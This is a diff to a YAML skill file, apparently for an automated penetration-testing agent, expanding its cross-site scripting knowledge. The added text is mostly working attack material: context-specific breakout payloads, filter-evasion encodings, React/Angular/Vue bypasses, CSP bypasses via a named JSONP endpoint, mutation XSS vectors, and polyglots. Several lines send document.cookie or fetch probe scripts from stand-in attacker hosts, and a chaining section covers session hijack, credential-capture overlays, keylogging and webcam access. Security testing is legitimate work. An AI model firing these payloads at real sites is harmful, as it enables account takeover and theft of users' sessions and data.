@@ -7,6 +7,8 @@ techniques:
   - "Blind XSS testing"
   - "CSP bypass techniques"
   - "Filter evasion methods"
+  - "Mutation XSS (mXSS)"
+  - "Framework-specific bypass"
 tools:
   - browser_navigate
   - nuclei
@@ -14,30 +16,101 @@ tools:
 knowledge: |
   Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web applications
   that are then executed in other users' browsers.
-  
-  ## XSS Types:
-  1. **Reflected XSS**: Payload reflected immediately in response
-  2. **Stored XSS**: Payload stored and executed when viewed by others
-  3. **DOM XSS**: Client-side script manipulation without server involvement
-  4. **Blind XSS**: Payload executed in unseen contexts (admin panels, logs)
-  
-  ## Detection Strategies:
-  - **Input Reflection**: Test if user input is reflected in HTML output
-  - **Context Analysis**: Identify where input appears (HTML, attributes, JavaScript)
-  - **Filter Testing**: Probe for input sanitization and filtering
-  - **Encoding Analysis**: Test different encoding methods
-  
-  ## Advanced Techniques:
-  - **CSP Bypass**: Exploit Content Security Policy weaknesses
-  - **Filter Evasion**: Use alternative syntax and encoding
-  - **Polyglot Payloads**: Payloads that work in multiple contexts
-  - **Event Handler Injection**: Exploit HTML event attributes
-  
-  ## Context-Specific Payloads:
-  - **HTML Context**: <script>, <img>, <svg> tags
-  - **Attribute Context**: Event handlers, href attributes
-  - **JavaScript Context**: String escaping, template literals
-  - **CSS Context**: Expression(), url(), @import
+
+  ## XSS Types
+  **Reflected**: payload in request → reflected in response. **Stored**: persisted server-side,
+  fires on every view. **DOM**: client-side JS writes attacker-controlled data to a sink
+  (innerHTML, document.write, eval, location). **Blind**: fires in contexts you never see —
+  admin dashboards, log viewers, email templates, PDF generators, support ticket systems.
+
+  ## Context-Aware Injection Map
+  Identify where your input lands, then pick the right breakout:
+  **HTML body**: <img src=x onerror=alert(1)>, <svg/onload=alert(1)>, <details open ontoggle=alert(1)>
+  **Attribute (double-quoted)**: " onfocus=alert(1) autofocus="
+  **Attribute (single-quoted)**: ' onfocus=alert(1) autofocus='
+  **Attribute (unquoted)**: space+onfocus=alert(1)+autofocus — no quote breakout needed
+  **href/src attribute**: javascript:alert(1), data:text/html,<script>alert(1)</script>
+  **JS string (single-quote)**: ';alert(1)// or \';alert(1)// if backslash-escaped
+  **JS string (double-quote)**: ";alert(1)// — same logic
+  **JS template literal**: ${alert(1)} — direct expression injection, no breakout needed
+  **Inside <script> block**: </script><img src=x onerror=alert(1)> — close the script tag first
+  **URL context (redirect param)**: javascript:alert(1), //attacker.com, data: URIs
+  **CSS context**: expression() (legacy IE), url('javascript:...'), behavior:url(), @import
+  **SVG/MathML namespace**: <svg><set onbegin=alert(1)>, <math><maction actiontype="statusline"
+  xlink:href="javascript:alert(1)"> — these bypass many HTML sanitizers
+  **Meta tags**: <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+  ## Filter Evasion Arsenal
+  **Tag blacklist bypass**: <img>, <svg>, <body>, <details>, <marquee>, <video>, <audio>,
+  <object>, <embed>, <iframe srcdoc="...">, <xss> (custom tags with tabindex+onfocus)
+  **Event handler alternatives**: onfocus, onblur, onerror, onload, onmouseover, ontoggle,
+  onbegin (SVG), onanimationstart (CSS trigger), onpointerrawupdate
+  **Case tricks**: <ScRiPt>, <IMG SRC=x ONERROR=alert(1)>
+  **Null bytes**: <scr%00ipt> — may bypass WAF but browser ignores null
+  **HTML encoding in attributes**: &#97;lert(1), &#x61;lert(1), &Tab; for whitespace insertion
+  **JS encoding**: \x61lert(1), \u0061lert(1), \141lert(1) (octal in some contexts)
+  **Double encoding**: %253C = < after double URL decode
+  **Prototype tricks**: constructor.constructor('alert(1)')() — bypass when alert is blocked
+
+  ## Framework-Specific Bypasses
+  **React**: dangerouslySetInnerHTML={{__html: payload}} — grep source for this pattern;
+  href={userInput} allows javascript: URIs in older React; SSR hydration mismatches can inject
+  **Angular**: ng-bind-html with $sce.trustAsHtml(), {{'a]'.constructor.prototype.charAt=...}}
+  class pollution, template injection via {{constructor.constructor('alert(1)')()}}
+  **Vue**: v-html directive renders raw HTML; :href with javascript: URI; server-side template
+  injection if Vue templates rendered server-side: {{_c.constructor('alert(1)')()}}
+  **jQuery**: .html(), .append(), .after() with user input → direct DOM XSS; $(location.hash)
+  selector injection in old jQuery; $.globalEval()
+
+  ## CSP Bypass Techniques
+  When CSP blocks inline scripts, look for:
+  **JSONP endpoints on whitelisted domains**: <script src="//whitelisted.cdn.com/jsonp?callback=alert">
+  **CDN-hosted libraries with gadgets**: angular.js on CDN → <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+  **base-uri missing**: <base href="//attacker.com/"> hijacks relative script/link paths
+  **script-src with 'unsafe-eval'**: direct eval/new Function/setTimeout('string') available
+  **Nonce reuse or prediction**: static nonces, nonces in cached responses, nonce in DOM readable via XSS
+  **object-src missing**: <object data="data:text/html,..."> for plugin-based execution
+  **'strict-dynamic' with trusted script**: inject via DOM after a trusted script loads
+  **Policy injection**: if CSP header reflects input, inject ;script-src 'unsafe-inline'
+  **Exfil without script-src**: <img src="//attacker.com/?c="+document.cookie> works if img-src is *
+
+  ## Mutation XSS (mXSS)
+  When browsers re-parse sanitized HTML, mutations can reintroduce dangerous elements:
+  - Inject content that looks safe to the sanitizer but mutates after innerHTML assignment
+  - <noscript><p title="</noscript><img src=x onerror=alert(1)>"> — parser context shift
+  - DOMPurify historically vulnerable to namespace confusion with SVG/MathML foreign content
+  - Look for sanitize-then-serialize-then-reparse flows — each round-trip is an mXSS opportunity
+
+  ## Polyglot Payloads
+  Work across multiple contexts simultaneously:
+  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
+  '"><img src=x onerror=alert(1)//
+  These are useful as initial probes before you know the injection context.
+
+  ## Blind XSS Setup
+  Inject payloads that phone home when triggered in unseen contexts:
+  "><script src=//yourserver.com/probe.js></script>
+  "><img src=x onerror="fetch('//yourserver.com/c?'+document.cookie)">
+  Good injection points: user-agent strings, form feedback, support tickets, profile bios,
+  file upload filenames, email headers, referrer fields, webhook URLs.
+  Your probe.js should capture: document.cookie, document.domain, window.location,
+  document.body.innerHTML (for DOM context), localStorage contents.
+
+  ## Chaining — XSS as Pivot
+  XSS → steal session cookie → account takeover (check HttpOnly flag first).
+  XSS → extract CSRF token → perform privileged actions as victim.
+  XSS → capture credentials via fake login form overlay.
+  XSS → read page content → access internal data/admin panels through victim's session.
+  XSS → hook browser with BeEF/custom JS → persistent control, keylogging, webcam.
+  Stored XSS in admin panel → admin session hijack → full application compromise.
+  XSS + missing X-Frame-Options → clickjacking combo for social engineering.
+
+  ## DOM XSS Source → Sink Mapping
+  **Sources**: location.hash, location.search, location.href, document.referrer,
+  window.name, postMessage event.data, document.cookie, Web Storage
+  **Sinks**: innerHTML, outerHTML, document.write, eval, setTimeout/setInterval with string,
+  location.assign, location.replace, element.src, jQuery.html(), $.globalEval
+  Trace data flow from source to sink — if no sanitization in between, it's exploitable.
 examples:
   - title: "Basic Reflected XSS"
     description: "Simple script injection in HTML context"
@@ -45,24 +118,36 @@ examples:
     validation: "Check if JavaScript alert executes in browser"
   - title: "Attribute Context XSS"
     description: "Break out of HTML attribute context"
-    payload: "\" onmouseover=\"alert('XSS')\""
+    payload: "\" onfocus=\"alert('XSS')\" autofocus=\""
     validation: "Verify if event handler is injected into attribute"
-  - title: "JavaScript Context XSS"
-    description: "Escape JavaScript string context"
-    payload: "'; alert('XSS'); //"
-    validation: "Check if JavaScript execution occurs"
+  - title: "JavaScript Template Literal Injection"
+    description: "Inject into ES6 template literal context"
+    payload: "${alert(document.domain)}"
+    validation: "Alert fires without needing quote breakout"
   - title: "SVG-based XSS"
     description: "Use SVG elements for script execution"
     payload: "<svg onload=alert('XSS')>"
     validation: "Verify SVG onload event triggers"
-  - title: "Filter Bypass - Double Encoding"
-    description: "Bypass filters using double URL encoding"
-    payload: "%253Cscript%253Ealert('XSS')%253C/script%253E"
-    validation: "Check if double-encoded payload executes"
+  - title: "CSP Bypass via JSONP"
+    description: "Abuse whitelisted JSONP endpoint to execute arbitrary JS"
+    payload: "<script src='//accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>"
+    validation: "JS executes despite CSP script-src restriction"
   - title: "DOM XSS via URL Fragment"
     description: "Exploit client-side URL processing"
     payload: "#<img src=x onerror=alert('XSS')>"
     validation: "Test if URL fragment is processed by JavaScript"
+  - title: "Angular Template Injection"
+    description: "Bypass Angular sandbox for XSS"
+    payload: "{{constructor.constructor('alert(1)')()}}"
+    validation: "Alert fires in Angular application context"
+  - title: "Blind XSS Probe"
+    description: "Inject callback payload for deferred execution"
+    payload: "\"><script src=//attacker.com/probe.js></script>"
+    validation: "HTTP request received at attacker server from victim browser"
+  - title: "Polyglot XSS"
+    description: "Multi-context payload for unknown injection point"
+    payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"
+    validation: "Test across HTML, attribute, and JS contexts"
 validation_methods:
   - "Execute JavaScript alert() or console.log() functions"
   - "Inject unique identifiers and search for them in response"
@@ -70,6 +155,8 @@ validation_methods:
   - "Use browser developer tools to verify DOM manipulation"
   - "Check for HTTP requests to external domains (for blind XSS)"
   - "Analyze Content Security Policy headers for bypass opportunities"
+  - "Trace DOM sources to sinks for client-side XSS confirmation"
+  - "Verify mutation XSS by comparing pre/post innerHTML assignment"
 references:
   - "https://owasp.org/www-community/attacks/xss/"
   - "https://portswigger.net/web-security/cross-site-scripting"
